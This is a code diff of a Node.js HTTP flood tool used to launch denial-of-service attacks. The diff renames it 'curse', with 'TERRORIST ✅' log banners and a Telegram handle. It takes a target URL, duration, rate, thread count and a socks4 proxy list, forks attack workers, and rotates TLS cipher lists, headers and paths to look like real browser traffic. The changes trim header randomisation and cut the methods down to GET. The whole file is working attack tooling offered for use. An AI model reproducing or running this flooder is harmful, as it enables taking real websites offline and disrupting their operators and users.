@@ -7,17 +7,15 @@ var path = require("path");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
-const { HeaderGenerator } = require('header-generator');
 const axios = require('axios');
 const https = require('https');
-const keep_alive = require('./keep_alive.js')
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });
 
-if (process.argv.length < 7){console.log(`node HTTPS.js target time rate(32) thread proxy.txt`); process.exit();}
+if (process.argv.length < 7){console.log(`\x1b[38;5;160mnode curse target time rate(\x1b[38;5;255m32\x1b[38;5;160m) thread socks4.txt \x1b[38;5;255m| \x1b[38;5;160mtelegram: \x1b[38;5;255m@xDAXG`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
@@ -28,7 +26,7 @@ const getCurrentTime = () => {
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
-   return `\x1b[38;5;255m(\x1b[38;5;160m${hours}:${minutes}:${seconds}\x1b[38;5;255m)`;
+   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
  };
 
  const targetURL = process.argv[2];
@@ -46,16 +44,17 @@ const getCurrentTime = () => {
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
-     console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} \x1b[38;5;255m(\x1b[32m${status}\x1b[38;5;255m)`);
+     console.clear()
+     console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} \x1b[38;5;255m(\x1b[32m${status}\x1b[38;5;255m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
-       console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} Request Timed Out`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mRequest Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
-       console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} Title: ${extractedTitle} \x1b[38;5;255m(\x1b[31m${error.response.status}\x1b[38;5;255m)`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
-       console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} ${error.message}`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} ${error.message}`);
      }
    });
 }
@@ -105,47 +104,19 @@ const args = {
 
 if (cluster.isMaster){
  console.clear();
- console.log(`
-                   __ _________________  ____
-                  / // /_  __/_  __/ _ \/ __/
-                 / _  / / /   / / / ___/\ \  
-                /_//_/ /_/   /_/ /_/  /___/                                                                  
-`);
+ console.log(`\n`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
-   console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack Thread \x1b[38;5;160m${i}\x1b[38;5;255m Started`);
+   console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160m\x1b[38;5;255mATTACK\x1b[38;5;160m Include: ${i} Thread(s) ${i} Started`);
  }
- console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mThe Attack Has Started`);
+ console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack\x1b[38;5;160m Has Been Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
-   console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mThe Attack Is Over`);
+   console.log(`\x1b[38;5;255m[\x1b[38;5;160mTERRORIST ✅\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mThe \x1b[38;5;255mAttack\x1b[38;5;160m Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
 } 
-
-let headerGenerator = new HeaderGenerator({
-   browsers: [
-       { name: "firefox", minVersion: 112, httpVersion: "2" },
-       { name: "opera", minVersion: 112, httpVersion: "2" },
-       { name: "edge", minVersion: 112, httpVersion: "2" },
-       { name: "chrome", minVersion: 112, httpVersion: "2" },
-       { name: "safari", minVersion: 16, httpVersion: "2" },
-   ],
-   devices: [
-       "desktop",
-       "mobile",
-   ],
-   operatingSystems: [
-       "windows",
-       "linux",
-       "macos",
-       "android",
-       "ios",
-   ],
-   locales: ["en-US", "en"]
-});
-let randomHeaders = headerGenerator.getHeaders()
 
 const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
@@ -249,158 +220,7 @@ lang_header = [
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
- 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-'en-US,en;q=0.5', 'en-US,en;q=0.9',
-'de-CH;q=0.7',
-'da, en-gb;q=0.8, en;q=0.7',
-'cs;q=0.5',
-'en-US,en;q=0.9',
-'en-GB,en;q=0.9',
-'en-CA,en;q=0.9',
-'en-AU,en;q=0.9',
-'en-NZ,en;q=0.9',
-'en-ZA,en;q=0.9',
-'en-IE,en;q=0.9',
-'en-IN,en;q=0.9',
-'ar-SA,ar;q=0.9',
-'az-Latn-AZ,az;q=0.9',
-'be-BY,be;q=0.9',
-'bg-BG,bg;q=0.9',
-'bn-IN,bn;q=0.9',
-'ca-ES,ca;q=0.9',
-'cs-CZ,cs;q=0.9',
-'cy-GB,cy;q=0.9',
-'da-DK,da;q=0.9',
-'de-DE,de;q=0.9',
-'el-GR,el;q=0.9',
-'es-ES,es;q=0.9',
-'et-EE,et;q=0.9',
-'eu-ES,eu;q=0.9',
-'fa-IR,fa;q=0.9',
-'fi-FI,fi;q=0.9',
-'fr-FR,fr;q=0.9',
-'ga-IE,ga;q=0.9',
-'gl-ES,gl;q=0.9',
-'gu-IN,gu;q=0.9',
-'he-IL,he;q=0.9',
-'hi-IN,hi;q=0.9',
-'hr-HR,hr;q=0.9',
-'hu-HU,hu;q=0.9',
-'hy-AM,hy;q=0.9',
-'id-ID,id;q=0.9',
-'is-IS,is;q=0.9',
-'it-IT,it;q=0.9',
-'ja-JP,ja;q=0.9',
-'ka-GE,ka;q=0.9',
-'kk-KZ,kk;q=0.9',
-'km-KH,km;q=0.9',
-'kn-IN,kn;q=0.9',
-'ko-KR,ko;q=0.9',
-'ky-KG,ky;q=0.9',
-'lo-LA,lo;q=0.9',
-'lt-LT,lt;q=0.9',
-'lv-LV,lv;q=0.9',
-'mk-MK,mk;q=0.9',
-'ml-IN,ml;q=0.9',
-'mn-MN,mn;q=0.9',
-'mr-IN,mr;q=0.9',
-'ms-MY,ms;q=0.9',
-'mt-MT,mt;q=0.9',
-'my-MM,my;q=0.9',
-'nb-NO,nb;q=0.9',
-'ne-NP,ne;q=0.9',
-'nl-NL,nl;q=0.9',
-'nn-NO,nn;q=0.9',
-'or-IN,or;q=0.9',
-'pa-IN,pa;q=0.9',
-'pl-PL,pl;q=0.9',
-'pt-BR,pt;q=0.9',
-'pt-PT,pt;q=0.9',
-'ro-RO,ro;q=0.9',
-'ru-RU,ru;q=0.9',
-'si-LK,si;q=0.9',
-'sk-SK,sk;q=0.9',
-'sl-SI,sl;q=0.9',
-'sq-AL,sq;q=0.9',
-'sr-Cyrl-RS,sr;q=0.9',
-'sr-Latn-RS,sr;q=0.9',
-'sv-SE,sv;q=0.9',
-'sw-KE,sw;q=0.9',
-'ta-IN,ta;q=0.9',
-'te-IN,te;q=0.9',
-'th-TH,th;q=0.9',
-'tr-TR,tr;q=0.9',
-'uk-UA,uk;q=0.9',
-'ur-PK,ur;q=0.9',
-'uz-Latn-UZ,uz;q=0.9',
-'vi-VN,vi;q=0.9',
-'zh-CN,zh;q=0.9',
-'zh-HK,zh;q=0.9',
-'zh-TW,zh;q=0.9',
-'am-ET,am;q=0.8',
-'as-IN,as;q=0.8',
-'az-Cyrl-AZ,az;q=0.8',
-'bn-BD,bn;q=0.8',
-'bs-Cyrl-BA,bs;q=0.8',
-'bs-Latn-BA,bs;q=0.8',
-'dz-BT,dz;q=0.8',
-'fil-PH,fil;q=0.8',
-'fr-CA,fr;q=0.8',
-'fr-CH,fr;q=0.8',
-'fr-BE,fr;q=0.8',
-'fr-LU,fr;q=0.8',
-'gsw-CH,gsw;q=0.8',
-'ha-Latn-NG,ha;q=0.8',
-'hr-BA,hr;q=0.8',
-'ig-NG,ig;q=0.8',
-'ii-CN,ii;q=0.8',
-'is-IS,is;q=0.8',
-'jv-Latn-ID,jv;q=0.8',
-'ka-GE,ka;q=0.8',
-'kkj-CM,kkj;q=0.8',
-'kl-GL,kl;q=0.8',
-'km-KH,km;q=0.8',
-'kok-IN,kok;q=0.8',
-'ks-Arab-IN,ks;q=0.8',
-'lb-LU,lb;q=0.8',
-'ln-CG,ln;q=0.8',
-'mn-Mong-CN,mn;q=0.8',
-'mr-MN,mr;q=0.8',
-'ms-BN,ms;q=0.8',
-'mt-MT,mt;q=0.8',
-'mua-CM,mua;q=0.8',
-'nds-DE,nds;q=0.8',
-'ne-IN,ne;q=0.8',
-'nso-ZA,nso;q=0.8',
-'oc-FR,oc;q=0.8',
-'pa-Arab-PK,pa;q=0.8',
-'ps-AF,ps;q=0.8',
-'quz-BO,quz;q=0.8',
-'quz-EC,quz;q=0.8',
-'quz-PE,quz;q=0.8',
-'rm-CH,rm;q=0.8',
-'rw-RW,rw;q=0.8',
-'sd-Arab-PK,sd;q=0.8',
-'se-NO,se;q=0.8',
-'si-LK,si;q=0.8',
-'smn-FI,smn;q=0.8',
-'sms-FI,sms;q=0.8',
-'syr-SY,syr;q=0.8',
-'tg-Cyrl-TJ,tg;q=0.8',
-'ti-ER,ti;q=0.8',
-'te;q=0.9,en-US;q=0.8,en;q=0.7',
-'tk-TM,tk;q=0.8',
-'tn-ZA,tn;q=0.8',
-'tt-RU,tt;q=0.8',
-'ug-CN,ug;q=0.8',
-'uz-Cyrl-UZ,uz;q=0.8',
-'ve-ZA,ve;q=0.8',
-'wo-SN,wo;q=0.8',
-'xh-ZA,xh;q=0.8',
-'yo-NG,yo;q=0.8',
-'zgh-MA,zgh;q=0.8',
-'zu-ZA,zu;q=0.8', 
+   
 ]
 
 accept_header = [
@@ -518,14 +338,6 @@ controle_header = [
 
 const Methods = [
  "GET",
- "HEAD",
- "POST",
- "PUT",
- "DELETE",
- "CONNECT",
- "OPTIONS",
- "TRACE",
- "PATCH",
 ];
 const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 
@@ -535,6 +347,7 @@ const queryStrings = [
 ];
 
 const pathts = [
+ "/",
  "?page=1",
  "?page=2",
  "?page=3",
@@ -1066,4 +879,5 @@ function runFlooder() {
         });
     });
 }
+
 
